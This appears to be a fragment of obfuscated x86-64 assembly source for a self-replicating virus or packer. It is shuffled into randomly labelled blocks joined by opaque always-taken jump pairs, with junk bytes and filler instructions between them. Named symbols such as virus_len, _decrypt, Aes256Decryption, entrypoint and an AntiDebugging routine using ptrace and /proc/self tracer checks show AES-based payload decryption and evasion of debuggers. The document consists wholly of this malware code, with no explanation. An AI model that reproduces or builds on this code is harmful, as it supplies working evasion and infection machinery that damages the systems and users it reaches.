    call        ..@KMAZPkFFQBCY
    jmp         ..@eLbwRq7I7UEb
..@IejIeEiPYsN4:
    mov         rbx, rbx
    jmp         $+5
db 0xa6, 0x8d, 0x1c
    js          ..@54GTjnWm3zfc
    jns         ..@54GTjnWm3zfc
..@noleCCWdKaEX:
    aesdec      xmm0, xmm1
    jmp         $+5
db 0x28, 0x10, 0x7b
    jmp         $+3
db 0x11
    jl          ..@tn7QPpvwvOkr
    jge         ..@tn7QPpvwvOkr
..@Ro6f2GLkp5uU:
%ifndef ENABLE_DEBUGGING
    xchg        rsp, rsp
%endif
    jmp         $+4
db 0x64, 0x8b
    jmp         $+5
db 0x0b, 0xb9, 0x3e
    jmp         $+3
db 0x38
    js          ..@lQdZiK6uClcX
    jns         ..@lQdZiK6uClcX
..@lEHAgK2HZiwY:
    GGLOBAL     virus_len
    jmp         $+3
db 0x82
    jb          ..@yRYHlZFuZpBH
    jae         ..@yRYHlZFuZpBH
..@Led1zU44Has9:
    push        rsi
    jmp         ..@NdRTzddW2Aug
..@dSBtAAPa3Ao5:
    xor         r1, r1
    jmp         $+3
db 0x9c
    jmp         $+3
db 0x1c
    js          ..@F1XlmuGhI736
    jns         ..@F1XlmuGhI736
..@SER8a5TziUGh:
    xchg        rdi, rdi
    jmp         $+4
db 0x76, 0xc7
    jl          ..@gY3RvWGw9JYG
    jge         ..@gY3RvWGw9JYG
..@TEEBlaiLV13Z:
    aesdec      xmm0, xmm1
    jmp         $+3
db 0x66
    je          ..@n4tQW1KvL5zV
    jne         ..@n4tQW1KvL5zV
..@6Etb5TwD8sXT:
    aesdec      xmm0, xmm1
    jmp         ..@WvTs36KhQgLG
..@7zbGo9FhBzxB:
    jne         ..@1eic9ecM99Kr
    jmp         $+5
db 0x54, 0x70, 0x4d
    jmp         $+5
db 0x36, 0x7e, 0x2b
    jmp         ..@iOFKBMhdwukH
..@vuvgKvJgr2gg:
    syscall
    jmp         ..@KhNToQGXDnlf
..@mgCxSoUkVbhH:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_PTRACE
%endif
    jmp         $+5
db 0x3f, 0x53, 0x28
    js          ..@LxUuHNTpanAt
    jns         ..@LxUuHNTpanAt
..@71d9HmigZuUj:
    push        rsi
    jmp         $+4
db 0x62, 0xfd
    jmp         ..@65t2PH1KzRnD
..@y759vhc5MLAH:
    mov         r2, QWORD [r4]
    jb          ..@JwTXCUeOEnMC
    jae         ..@JwTXCUeOEnMC
..@vrA93CCVij99:
%ifndef ENABLE_DEBUGGING
    pop         rdx
%endif
    jmp         ..@OIUL7SuRws5r
..@PMaRI3oNs2Vl:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+4
db 0xe1, 0x5a
    js          ..@qdOla3A1fcJE
    jns         ..@qdOla3A1fcJE
..@JWlz9AqXhTx7:
    push        r2
    jmp         $+3
db 0x3b
    jmp         $+3
db 0x6f
    jmp         ..@94yeiJJUqYz2
..@aHHoKXVtWr4w:
    aesdec      xmm0, xmm1
    jmp         $+5
db 0xae, 0xe4, 0x95
    je          ..@XdJAMNDitZyu
    jne         ..@XdJAMNDitZyu
..@dfm5650JhgB0:
    add         r4, bytes
    js          ..@ivWdvSHV0ysl
    jns         ..@ivWdvSHV0ysl
..@gYi6iyTiIdBy:
%ifndef ENABLE_DEBUGGING
    xchg        rdx, rdx
%endif
    jmp         $+4
db 0xfc, 0xdc
    jmp         $+3
db 0xb5
    jmp         ..@qE1dNQ50OZsw
..@OJZXoyCWsfn1:
    rep         movsd
    jmp         $+3
db 0x2a
    jb          ..@YSiR8TSU5Ofl
    jae         ..@YSiR8TSU5Ofl
..@RagESIsm0USB:
    jl          ..@5BqMDdSZW2O7
    jmp         $+4
db 0x47, 0xb1
    jb          ..@cRnKRRjUJ3n5
    jae         ..@cRnKRRjUJ3n5
..@DyAg8mGiziGy:
%ifndef ENABLE_DEBUGGING
    xchg        rsp, rsp
%endif
    jmp         $+5
db 0x4c, 0x79, 0xc0
    jmp         $+4
db 0x0a, 0x46
    je          ..@QRtoIQs9EfPC
    jne         ..@QRtoIQs9EfPC
..@gQILIqjg6tCC:
    movdqu      xmm1, OWORD [rsp+0x40]
    jb          ..@OW7UI4VwcHXi
    jae         ..@OW7UI4VwcHXi
..@0tpRqNtqE3Ij:
    pop         rax
    jmp         $+4
db 0x49, 0xaa
    jmp         $+5
db 0xc2, 0x16, 0xe8
    je          ..@ZzMCQiZPel43
    jne         ..@ZzMCQiZPel43
..@p8R7oAjK3JH4:
    xchg        rdi, rdi
    jmp         $+3
db 0xca
    jl          ..@Y2ZNAQexW62K
    jge         ..@Y2ZNAQexW62K
..@EaLtaPswVsiB:
%ifndef ENABLE_DEBUGGING
    xchg        rsp, rsp
%endif
    jb          ..@iOoBEiQNj6NV
    jae         ..@iOoBEiQNj6NV
..@1zhxnjMP4SOp:
    mov         rax, rax
    jl          ..@8dwMYVxX9BhA
    jge         ..@8dwMYVxX9BhA
..@rdSWUyV7Ac2q:
%ifndef ENABLE_DEBUGGING
    mov         rax, rax
%endif
    jmp         $+3
db 0xa0
    jmp         ..@paPZsmvjPMDr
..@1gosmrVizBxT:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    jl          ..@qmrdUWwVtMPp
    jge         ..@qmrdUWwVtMPp
..@88mllWcpkURn:
    aesdec      xmm0, xmm1
    jmp         $+5
db 0x68, 0x62, 0x11
    js          ..@xL03DXWiTxYU
    jns         ..@xL03DXWiTxYU
..@nyLaHFlIiVSs:
    aeskeygenassist xmm2, xmm1, 0x0
    jmp         $+3
db 0x09
    jmp         $+5
db 0xb6, 0x5d, 0x0e
    jmp         $+4
db 0x1f, 0x0d
    jmp         $+5
db 0x96, 0x60, 0x9c
    jmp         ..@wc886MnEMnDV
Strncmp:
    jmp         ..@A3zgG8yXggQp
..@HpO8SztHh8yt:
    pop         rcx
    jl          ..@CiYx1zFWRvEH
    jge         ..@CiYx1zFWRvEH
..@Jl8y2OJgSi2r:
    mov         r2, r5
    jmp         ..@graRcSeAWotP
..@iiotwiX7iZOW:
    mov         rsp, rsp
    jl          ..@ZvLi6l3LdS8t
    jge         ..@ZvLi6l3LdS8t
..@8PtHHsw5eRKd:
    movdqu      OWORD [rsp+0xd0],xmm0
    jmp         $+4
db 0xf6, 0x2a
    js          ..@K3S8l93ILBb7
    jns         ..@K3S8l93ILBb7
..@ivWdvSHV0ysl:
    jmp         ..@WjMP7iHiDoeT
    jmp         ..@HWFCs3hVgRYn
..@TaFMsm6F5CRC:
    aeskeygenassist xmm2, xmm3, 0x40
    jmp         $+4
db 0x05, 0xbb
    jmp         $+5
db 0xe6, 0xaf, 0x8f
    je          ..@1SILyi6PKvYV
    jne         ..@1SILyi6PKvYV
..@54oA63PYgaWw:
    pxor        xmm1, xmm2
    js          ..@rLWC3BOdjUtD
    jns         ..@rLWC3BOdjUtD
..@P6mj0Rm5zzSw:
    ret
    jmp         $+3
db 0xbd
    jb          ..@0ByEjUq8YaqY
    jae         ..@0ByEjUq8YaqY
..@FRJFgTkajPkB:
    pop         rcx
    jmp         $+4
db 0x2d, 0x09
    jmp         $+5
db 0x66, 0x3e, 0x30
    jl          ..@yWHG6mb6FuBV
    jge         ..@yWHG6mb6FuBV
..@GDe4dvAnOM9j:
    cmp         eax, 0x0
    jmp         ..@D41utR90PQWG
..@dzUuYTmGIB8r:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_WAIT4
%endif
    jmp         ..@gYi6iyTiIdBy
..@fKhAV7aEp9rJ:
    mov         rsi, QWORD [rsp+_AESD_OFF.startaddr]
    jmp         ..@p8R7oAjK3JH4
..@6jrtP1uRaNWh:
%ifndef ENABLE_DEBUGGING
    xchg        rdx, rdx
%endif
    jmp         $+3
db 0x18
    jmp         ..@C8qpcINVP7OV
..@vyhAw0CD9PeU:
%ifndef ENABLE_DEBUGGING
    test        eax, eax
%endif
    jmp         $+5
db 0x03, 0xe0, 0x3a
    jl          ..@sg5eEg548Y6h
    jge         ..@sg5eEg548Y6h
..@BsHgUnQPfFIM:
    push        rcx
    jmp         $+5
db 0xad, 0xca, 0x44
    jmp         $+5
db 0x73, 0x41, 0xde
    jmp         $+5
db 0xc7, 0x23, 0xd9
    je          ..@R3ZqtjJjiyPh
    jne         ..@R3ZqtjJjiyPh
..@tr8KicmjUfrh:
    xor         rax, rax
    jl          ..@Mxl2pJ0i993p
    jge         ..@Mxl2pJ0i993p
..@jjO8HoRlHJMU:
%ifndef ENABLE_DEBUGGING
    VAR         public, columns
%endif
    jl          ..@thjKBBuuvJ0A
    jge         ..@thjKBBuuvJ0A
..@Bk3lQ7Au4XEp:
    xor         rax, rax
    jl          ..@afYHiuFrg8bv
    jge         ..@afYHiuFrg8bv
..@iikAMPurDbXf:
    xchg        rcx, rcx
    je          ..@2ZCcksukFnCr
    jne         ..@2ZCcksukFnCr
..@5pR1WWMa0TlN:
    pop         rbx
    jmp         ..@0VJi0HCHzk5o
..@LJv9psAF6Sdn:
    xchg        rbx, rbx
    jmp         ..@0zj48eGPQ0Nd
..@uqy2P4hxFgKw:
%ifndef ENABLE_DEBUGGING
    pop         rdx
%endif
    jmp         $+4
db 0x0a, 0xf1
    jmp         ..@zGXItHWSDvAW
..@C1XrpeG9a1Db:
%ifndef ENABLE_DEBUGGING
    OFILE       [r5], 0x0
%endif
    jb          ..@nSpHRHjXqIRz
    jae         ..@nSpHRHjXqIRz
..@mkQEKVu2npre:
    or          r2, PAGE_SIZE-1
    jmp         $+3
db 0x6e
    jb          ..@ml04y5BEVNTk
    jae         ..@ml04y5BEVNTk
..@gQxRSvqmClt2:
    mov         rsp, rsp
    jmp         ..@e3FkTqVTpCWx
..@KGlRhXZzJi1Y:
    mov         vsp, rdi
    jmp         $+4
db 0x65, 0x52
    jb          ..@4hDkkMmVIfA9
    jae         ..@4hDkkMmVIfA9
..@7qYoYhux4wUM:
    xchg        rax, rax
    jmp         $+5
db 0x9e, 0x59, 0x8b
    jmp         ..@4pGAsq8dxygO
..@1bT76qeBdURZ:
%ifndef ENABLE_DEBUGGING
    jnz         ..@IwuzLc8I7NYD
%endif
    jmp         $+4
db 0xbc, 0x3e
    js          ..@v9kt86fNlIKa
    jns         ..@v9kt86fNlIKa
..@JBCQNV4blabR:
%ifndef ENABLE_DEBUGGING
    xchg        rcx, rcx
%endif
    je          ..@qTT3Z37KpVMa
    jne         ..@qTT3Z37KpVMa
..@dpzVdSjaYYMx:
    call        Aes256Decryption
    jmp         $+4
db 0xa9, 0x5f
    jmp         $+4
db 0x8f, 0x64
    jmp         ..@KYvgZyWqEtKs
..@cUZwIN2HxFFf:
    mov         rbp, rbp
    jmp         $+3
db 0xc8
    jl          ..@JIYptvl2mERx
    jge         ..@JIYptvl2mERx
..@v2kG2lT6em9N:
    mov         rcx, rcx
    js          ..@UaF7M7vqPohF
    jns         ..@UaF7M7vqPohF
..@IfMFBYjLBnKz:
    mov         rdi, rdi
    jmp         $+4
db 0xd9, 0x1f
    je          ..@sHcLqcFIztru
    jne         ..@sHcLqcFIztru
..@E329RMmGUlSz:
    and         r3, 0ffffffffffffffe0h
    jmp         $+5
db 0xca, 0xa8, 0x71
    jb          ..@CRPNNEX319bN
    jae         ..@CRPNNEX319bN
..@4ZDNxLMlifEo:
    add         rax, 1
    jl          ..@4tkcPS7qEZWc
    jge         ..@4tkcPS7qEZWc
..@jEhFmXlk7Ngf:
    mov         rcx, rcx
    jmp         ..@OZWA5NMT10cE
..@dDqHCTU2XrbM:
    movdqu      xmm1, OWORD [rsp+0x80]
    jmp         ..@AfyJLeQzN8dU
..@tn7QPpvwvOkr:
    push        rbx
    jmp         $+3
db 0xee
    js          ..@Lf42hTPUF87S
    jns         ..@Lf42hTPUF87S
..@6jJxUiqNr9PR:
    push        rcx
    js          ..@rYSEpylanKuD
    jns         ..@rYSEpylanKuD
..@Op2yaAsZ9m7a:
%ifndef ENABLE_DEBUGGING
    jnz         ..@rdSWUyV7Ac2q
%endif
    js          ..@HwkSyr3nSM4c
    jns         ..@HwkSyr3nSM4c
..@7ErOXGfVFVUQ:
%ifndef ENABLE_DEBUGGING
    add         rax, tracerline_size
%endif
    jmp         ..@ZevK5eCvMLPX
..@hDQkbA4gxo3H:
    push        rax
    jmp         $+4
db 0xf5, 0x19
    jmp         $+3
db 0xf2
    jl          ..@TCVygRIMej6D
    jge         ..@TCVygRIMej6D
..@m2H4eQ0Sez51:
%ifndef ENABLE_DEBUGGING
    xor         r2, r2
%endif
    jmp         $+4
db 0xa9, 0x9f
    jmp         $+5
db 0xf0, 0x55, 0xbc
    jmp         ..@O8zmfsgfTsvF
..@cRnKRRjUJ3n5:
    test        eax, eax
    jmp         ..@MvcodKo4tSGL
..@JEDa2yPBZ8q3:
%ifndef ENABLE_DEBUGGING
    rep         nop
%endif
    jmp         ..@ZfCOJXNdGkg5
..@v8K3ci90PHYX:
    xchg        rax, rax
    je          ..@nobJSibXBhkz
    jne         ..@nobJSibXBhkz
..@lU9mei7HF9pn:
    movdqu      xmm0, OWORD [r1]
    jmp         $+5
db 0xcb, 0x1d, 0x46
    jmp         $+4
db 0x48, 0xdf
    js          ..@HEaScV2JDrVc
    jns         ..@HEaScV2JDrVc
..@kKvptywMKF77:
    pop         rbx
    jl          ..@FSDFFFJge1uK
    jge         ..@FSDFFFJge1uK
..@Fe6yyE8gMqq8:
    mov         rcx, rcx
    jmp         $+3
db 0xf7
    js          ..@yZD0k44tVdNy
    jns         ..@yZD0k44tVdNy
..@eb2d5Ma7ya5q:
    mov         QWORD [rsp+_AESD_OFF.length], r2
    jmp         $+4
db 0x7a, 0x92
    jmp         ..@xqvnwYHAvl8e
..@K4u5vuuugw1Y:
    pxor        xmm1, xmm4
    jmp         $+5
db 0xfb, 0x0f, 0xee
    js          ..@9PMCtyHT54EH
    jns         ..@9PMCtyHT54EH
..@zZASzEGJqHkc:
    push        rdi
    jb          ..@LPoaoKdfV9fr
    jae         ..@LPoaoKdfV9fr
..@wW3Ch8DPqQH8:
    xchg        rdi, rdi
    jmp         $+5
db 0x9f, 0xda, 0x62
    jmp         ..@AVEONqxHhpSH
..@HM5UkuiqnIFa:
    push        rdi
    jmp         $+5
db 0x06, 0xdf, 0xc2
    jmp         ..@PAXi4xSgG3cg
..@G9b4YeD8Eic5:
%ifndef ENABLE_DEBUGGING
    jnz         ..@IwuzLc8I7NYD
%endif
    jmp         ..@RPGKvIiesnjq
..@MvcodKo4tSGL:
    jz          ..@tr8KicmjUfrh
    js          ..@i65jaYuAxfUM
    jns         ..@i65jaYuAxfUM
..@JIYptvl2mERx:
    mov         r4, m4
    jl          ..@WjMP7iHiDoeT
    jge         ..@WjMP7iHiDoeT
..@WPZQf12LFhPy:
    mov         rbp, rbp
    jmp         $+4
db 0xab, 0xd8
    jmp         ..@Led1zU44Has9
..@VlNR9zpYKrfI:
    movdqu      OWORD [rsp+0x70],xmm0
    jl          ..@tzNn4flbLalH
    jge         ..@tzNn4flbLalH
..@6fHdYZSdb3mq:
    pop         rsi
    jmp         $+4
db 0xcb, 0xd3
    jmp         $+4
db 0x49, 0x8a
    jmp         $+4
db 0x7e, 0xd2
    jb          ..@nVVLNz4R5yTS
    jae         ..@nVVLNz4R5yTS
..@67FoesuwuBa6:
    movdqa      OWORD [rsi+0xb0], xmm3
    js          ..@bo4Ny8kmN2Mv
    jns         ..@bo4Ny8kmN2Mv
..@ZD5w60qDs3gr:
    movdqu      xmm1, OWORD [rsp+0xb0]
    jmp         $+3
db 0x72
    jmp         $+3
db 0x30
    jmp         $+4
db 0xc4, 0x8f
    jmp         $+4
db 0x83, 0xb9
    jmp         $+5
db 0x85, 0x0e, 0x41
    jmp         ..@3NIhSLA8XcYm
..@dX2Za9PoBPxc:
    pop         rbx
    jmp         $+4
db 0x3a, 0x9c
    je          ..@jiqCRH9diZz5
    jne         ..@jiqCRH9diZz5
..@kii9LhsRmapS:
    movdqu      xmm3, OWORD [r2+rax+0x10]
    jmp         $+3
db 0x65
    js          ..@GRDfWa1eoAPL
    jns         ..@GRDfWa1eoAPL
..@KkKGFKuGrVZ7:
    push        rbx
    jl          ..@5NMNROOoAuQX
    jge         ..@5NMNROOoAuQX
..@IkiYhcUobked:
    push        rbp
    jmp         $+5
db 0x39, 0x8e, 0x23
    jmp         $+4
db 0x15, 0xe7
    js          ..@n4Gt2cJ1vFRm
    jns         ..@n4Gt2cJ1vFRm
..@9mvkHvsQySmM:
    pop         rdx
    jb          ..@Bk3lQ7Au4XEp
    jae         ..@Bk3lQ7Au4XEp
..@kHG5t33XFxww:
    ret
    js          ..@8zIq44Se6xMQ
    jns         ..@8zIq44Se6xMQ
..@629mFP8gSfUL:
    movdqu      OWORD [rsp+0xb0],xmm0
    jb          ..@Po25kRm1OWyB
    jae         ..@Po25kRm1OWyB
..@CbT9SguFfGnu:
    movdqa      OWORD [rsi+0x70], xmm3
    js          ..@TYCC1e2yFB4J
    jns         ..@TYCC1e2yFB4J
..@FE8niPp4hMbT:
    xchg        rbx, rbx
    jmp         $+3
db 0x0c
    jl          ..@KnyBRlAzDsQL
    jge         ..@KnyBRlAzDsQL
..@DcUc2jMyZLzl:
    movdqu      xmm3, [rdi+0x10]
    jmp         $+4
db 0x27, 0x82
    jmp         $+5
db 0xf4, 0x1c, 0xed
    js          ..@BS1AhAa6f5QA
    jns         ..@BS1AhAa6f5QA
..@QZfPSh9rVdNf:
    push        r1
    jmp         $+3
db 0xcd
    je          ..@oWEVEvGFxTI1
    jne         ..@oWEVEvGFxTI1
..@DvQwFb2H0MjZ:
    pop         rbx
    jmp         $+5
db 0x03, 0x44, 0x87
    jmp         $+5
db 0xcb, 0xe2, 0x19
    jmp         $+4
db 0x0d, 0x4a
    jmp         ..@tjS9gBjRsBcd
..@RRiGfmr6Ua4i:
    push        rbx
    jmp         $+3
db 0x0a
    jmp         $+4
db 0x39, 0x10
    jmp         ..@kKvptywMKF77
..@ZzMCQiZPel43:
    xchg        rax, rax
    jmp         $+3
db 0x07
    jl          ..@MYOI0lPycFNQ
    jge         ..@MYOI0lPycFNQ
..@JPLtMWGIOOPR:
%ifndef ENABLE_DEBUGGING
    xchg        rax, rax
%endif
    jmp         $+5
db 0x54, 0xae, 0xe2
    jb          ..@YcuGL1PiIt3P
    jae         ..@YcuGL1PiIt3P
..@RDIOhaNy49xE:
    push        r3
    jl          ..@HllyDg5Ml20R
    jge         ..@HllyDg5Ml20R
..@Le4B1h8JcXp9:
    pslldq      xmm4, 0x4
    jmp         ..@GW7CDZhoiMgK
..@CgG9YyQYbVw2:
    xor         r1, r1
    jl          ..@FXWyhJT1JdSH
    jge         ..@FXWyhJT1JdSH
..@klHLUa5fZgxG:
    pop         rdi
    jmp         $+3
db 0x63
    jmp         ..@u8blAqkKOKTj
..@SzyycYGXi47c:
    pop         rbx
    jb          ..@ikjiPKpa3KjH
    jae         ..@ikjiPKpa3KjH
..@aqZNZ9gcRO1n:
    GGLOBAL     _decrypt
    jb          ..@0mlE3bORaWHP
    jae         ..@0mlE3bORaWHP
..@JVMtCJ94Qjna:
    push        rsi
    jmp         $+3
db 0x78
    jmp         ..@XYsvqJeVgkt2
..@PdcDv1CIqTlR:
%ifndef ENABLE_DEBUGGING
    push        rbx
%endif
    jmp         $+4
db 0xbe, 0x03
    je          ..@YmDeJpXViYEa
    jne         ..@YmDeJpXViYEa
..@MYOI0lPycFNQ:
    movdqu      xmm1, OWORD [rsp+0x60]
    jmp         ..@aHHoKXVtWr4w
..@aRcg6AX9sP7r:
%ifndef ENABLE_DEBUGGING
    pop         rcx
%endif
    jb          ..@8HQm5bLIg0wc
    jae         ..@8HQm5bLIg0wc
..@i4xAuxp7d3GC:
    call        ExitProgram
    js          ..@1eic9ecM99Kr
    jns         ..@1eic9ecM99Kr
..@AEzVPktsI6FA:
    pop         rdi
    jmp         ..@sJPwUp8VFQpD
..@NdRTzddW2Aug:
    pop         rsi
    jmp         ..@9v1PcOLv0xu0
..@A22z9RQ0xqDl:
    movdqa      OWORD [rsi+0x60], xmm1
    jmp         $+5
db 0x63, 0x65, 0x1c
    jmp         ..@nyLaHFlIiVSs
..@qpnlGklbyW0d:
    push        rsi
    jmp         $+5
db 0x8c, 0x58, 0x11
    jmp         $+5
db 0x9e, 0x2a, 0xb0
    jl          ..@1XbKFcqHI412
    jge         ..@1XbKFcqHI412
..@RcUIZKAg9iUf:
    mov         rcx, rcx
    jb          ..@PMaRI3oNs2Vl
    jae         ..@PMaRI3oNs2Vl
..@oxWhIHwjC6Fc:
    sub         al, BYTE [r2]
    jmp         $+3
db 0x6f
    js          ..@UXdWOtI8OrWz
    jns         ..@UXdWOtI8OrWz
..@Kwl63lEEW1UT:
%ifndef ENABLE_DEBUGGING
    VAR         public, procself
%endif
    jmp         $+3
db 0x2b
    jl          ..@8ZbtA7PK8pqX
    jge         ..@8ZbtA7PK8pqX
..@OW7UI4VwcHXi:
    mov         rbx, rbx
    jmp         $+5
db 0x3a, 0xa3, 0xc4
    jl          ..@G6FHHgwy4CHM
    jge         ..@G6FHHgwy4CHM
..@GSiYtOxmqq5s:
    push        rsi
    jmp         $+4
db 0x95, 0xc2
    jmp         ..@gWVstD5GV6Bt
..@Md1Tm3fCHOW3:
    xchg        rcx, rcx
    js          ..@tDX0OeXLKQTd
    jns         ..@tDX0OeXLKQTd
..@QukD47FRYnPV:
    syscall
    jmp         $+5
db 0x5d, 0x52, 0xb7
    jb          AntiDebugging
    jae         AntiDebugging
..@RvCVSOK13rIm:
    cmp         BYTE [r2], al
    js          ..@lVbQdBLeaheS
    jns         ..@lVbQdBLeaheS
..@lKCzXDhCQgZ4:
    and         r2, 0xfffffffffffffff0
    jl          ..@5FTtZAqPmtCk
    jge         ..@5FTtZAqPmtCk
Memmem:
    jmp         ..@QZfPSh9rVdNf
..@GIY1fFs4F7a4:
%ifndef ENABLE_DEBUGGING
    rep         nop
%endif
    js          ..@nmP4kSe9FxI4
    jns         ..@nmP4kSe9FxI4
..@B4cMOlyhai6Q:
    push        r3
    jmp         $+4
db 0x05, 0x5e
    jmp         $+4
db 0x0d, 0xa8
    jmp         ..@WxPLn5Rjg5M0
..@xEAKLqOtt9ru:
    GGLOBAL     entrypoint
    jb          ..@kzwlnzPxpgIe
    jae         ..@kzwlnzPxpgIe
..@aEJNJDp3cSaI:
%ifndef ENABLE_DEBUGGING
    pop         rsi
%endif
    jmp         ..@mgCxSoUkVbhH
..@TYCC1e2yFB4J:
    aeskeygenassist xmm2, xmm3, 0x8
    jb          ..@VrXrekMoLpyl
    jae         ..@VrXrekMoLpyl
..@TIvtsJKMBpZy:
    GGLOBAL     virus_len
    je          ..@v2kG2lT6em9N
    jne         ..@v2kG2lT6em9N
..@uvvaAtLPGbLC:
    ret
    jmp         $+4
db 0xbd, 0xbd
    jmp         ..@QD0Xbwg9GTO5
..@eaTsy9B0Ss9r:
    xor         rax, rax
    jmp         ..@pAfZ0Fd9olaJ
..@Axe1m3gW0Cgo:
%ifndef ENABLE_DEBUGGING
    pop         rax
%endif
    jmp         $+5
db 0x6c, 0x87, 0xba
    jmp         $+5
db 0x73, 0xae, 0x33
    jmp         ..@2sCcea8T6gBb
..@EsfiKZ7ce7fI:
%ifndef ENABLE_DEBUGGING
    pop         rbx
%endif
    jmp         ..@Ro6f2GLkp5uU
..@FzamSSWd9H0f:
%ifndef ENABLE_DEBUGGING
    mov         rsi, rsi
%endif
    jb          ..@EPO52JIwBzol
    jae         ..@EPO52JIwBzol
..@zGXItHWSDvAW:
%ifndef ENABLE_DEBUGGING
    xchg        rdi, rdi
%endif
    jl          ..@wKhdZVWTLUTi
    jge         ..@wKhdZVWTLUTi
..@SijYGInSC9MM:
    push        rsi
    jmp         $+4
db 0xa0, 0xac
    jmp         ..@2O1PopfGXMml
..@ZvLi6l3LdS8t:
    aesdec      xmm0, xmm1
    js          ..@QMl4AXyqDmj9
    jns         ..@QMl4AXyqDmj9
..@qk8WD7EFSDvk:
%ifndef ENABLE_DEBUGGING
    call        Memmem
%endif
    jmp         ..@7ErOXGfVFVUQ
..@Ct6NSVR3T4xP:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    jmp         $+3
db 0x27
    jmp         ..@Y7lXmyC7UUuP
..@ugCL3wT6jyZH:
    jl          ..@K3S8l93ILBb7
    jmp         ..@yJWEr6u7zqOQ
..@qPLT6PgxYYkV:
    pop         rdi
    jmp         $+4
db 0xcd, 0xa0
    jmp         $+4
db 0x7f, 0x91
    jb          ..@RmSiQsaAKwh3
    jae         ..@RmSiQsaAKwh3
..@iyvwTPK01DJ6:
%ifndef ENABLE_DEBUGGING
    mov         rdi, rdi
%endif
    jmp         ..@pVzCoPjF0U5p
..@HB9U6dkhDfTX:
    pop         rsi
    jl          ..@9lvqNlOBOB9a
    jge         ..@9lvqNlOBOB9a
..@ZBbsK5Hjj0JF:
%ifndef ENABLE_DEBUGGING
    push        rcx
%endif
    jmp         $+5
db 0xa8, 0x7f, 0x85
    je          ..@6Su3JlBB3qnO
    jne         ..@6Su3JlBB3qnO
..@wujrcDuIAkwV:
%ifndef ENABLE_DEBUGGING
    xchg        rsp, rsp
%endif
    jl          ..@FzamSSWd9H0f
    jge         ..@FzamSSWd9H0f
..@GRDfWa1eoAPL:
    pxor        xmm0, xmm2
    jmp         $+4
db 0x61, 0x06
    jmp         $+3
db 0xae
    jmp         ..@3LCJz5jhnRq6
..@xTs49KhYgHyx:
    mov         rdx, rdx
    jb          ..@KkKDknwaPIMz
    jae         ..@KkKDknwaPIMz
..@AfyJLeQzN8dU:
    xchg        rsi, rsi
    jmp         $+5
db 0x16, 0x38, 0x70
    jmp         $+5
db 0xf1, 0x00, 0x2f
    jb          ..@eLMgsRoWfdlr
    jae         ..@eLMgsRoWfdlr
..@28G8DD4XdYc0:
    mov         rcx, rcx
    jmp         ..@SKVmudiXISDt
..@LTXNUpIhNRcI:
    mov         rcx, rcx
    js          ..@NXgVN56eDQSK
    jns         ..@NXgVN56eDQSK
..@B23Jo2ZpBASK:
    push        rsi
    js          ..@HuPoGyEsgplv
    jns         ..@HuPoGyEsgplv
..@SFG4r0NAFYkF:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    jmp         $+5
db 0x68, 0x87, 0x8f
    jl          ..@U7R1FH4owHAE
    jge         ..@U7R1FH4owHAE
..@BjmPXzPjtfvF:
%ifndef ENABLE_DEBUGGING
    mov         r1, rax
%endif
    jmp         $+3
db 0xea
    jmp         $+3
db 0xae
    js          ..@wujrcDuIAkwV
    jns         ..@wujrcDuIAkwV
..@qdOla3A1fcJE:
    call        ..@QD0Xbwg9GTO5
    js          ..@xTs49KhYgHyx
    jns         ..@xTs49KhYgHyx
..@DxGRjab3pGeI:
    jz          ..@XW4CDDCt8gU1
    js          ..@kbhMcHrHSRJx
    jns         ..@kbhMcHrHSRJx
..@fb55Vg4UCJAc:
    pop         rcx
    jl          ..@LpkPqot1rqf8
    jge         ..@LpkPqot1rqf8
..@VrXrekMoLpyl:
    call        ..@KMAZPkFFQBCY
    jmp         $+5
db 0xa8, 0xf3, 0xe5
    jmp         ..@Uqy74j1WFBgH
..@aajEjSOkwXfj:
    movdqu      OWORD [rsp+0x20],xmm0
    jmp         $+5
db 0x61, 0xee, 0x20
    jmp         $+4
db 0xd2, 0x86
    js          ..@3eFceyHfDIRb
    jns         ..@3eFceyHfDIRb
..@D7egwoURTbcL:
%ifndef ENABLE_DEBUGGING
    push        rcx
%endif
    jmp         $+4
db 0x80, 0x15
    js          ..@aRcg6AX9sP7r
    jns         ..@aRcg6AX9sP7r
..@vkQVGfs3ZtKp:
    and         r1, ~(PAGE_SIZE-1)
    js          ..@71d9HmigZuUj
    jns         ..@71d9HmigZuUj
..@vFgASbm8IcXK:
    xchg        rsi, rsi
    jl          ..@zTL7GGrj1j0N
    jge         ..@zTL7GGrj1j0N
..@cToGYg3BHExd:
    xor         r3, r3
    jmp         $+4
db 0xda, 0xb3
    jmp         $+5
db 0xc6, 0x3c, 0xa4
    jl          ..@ggqP4Ny0Anvl
    jge         ..@ggqP4Ny0Anvl
..@KFTR6h9eChaX:
    mov         rcx, rcx
    jl          ..@9GKRsEmF9dqF
    jge         ..@9GKRsEmF9dqF
..@EPO52JIwBzol:
%ifndef ENABLE_DEBUGGING
    push        rbx
%endif
    jmp         $+3
db 0xc8
    jb          ..@Ai2LQwqfwQQM
    jae         ..@Ai2LQwqfwQQM
..@CMdaEADeNcnx:
    pslldq      xmm4, 0x4
    jmp         ..@gEwOiB5Mj6oc
..@k4NyO9zXYFBJ:
    xchg        rdx, rdx
    jmp         $+3
db 0x3e
    jmp         $+3
db 0xa9
    jl          ..@JZit9zAHSwd0
    jge         ..@JZit9zAHSwd0
..@9v1PcOLv0xu0:
    movdqu      OWORD [rsp+0xc0],xmm0
    jmp         ..@Rx4gXunsVFMU
..@wc886MnEMnDV:
    call        ..@QD0Xbwg9GTO5
    jmp         $+5
db 0xe3, 0xae, 0xc1
    jmp         $+3
db 0x7d
    jb          ..@CbT9SguFfGnu
    jae         ..@CbT9SguFfGnu
..@zq6p48TjB9ff:
    push        rdi
    jmp         $+3
db 0x82
    jl          ..@j7DCLiy4nr0r
    jge         ..@j7DCLiy4nr0r
..@OmWePgoGVZzl:
    pop         rsi
    jmp         $+3
db 0xe3
    jmp         $+4
db 0x5e, 0x13
    js          ..@KkKGFKuGrVZ7
    jns         ..@KkKGFKuGrVZ7
..@3TvrveITQT6k:
%ifndef ENABLE_DEBUGGING
    push        rsi
%endif
    jl          ..@JbD19RbtyoFf
    jge         ..@JbD19RbtyoFf
AntiDebugging:
    jmp         ..@dSBtAAPa3Ao5
..@Qer9BGiWNDkO:
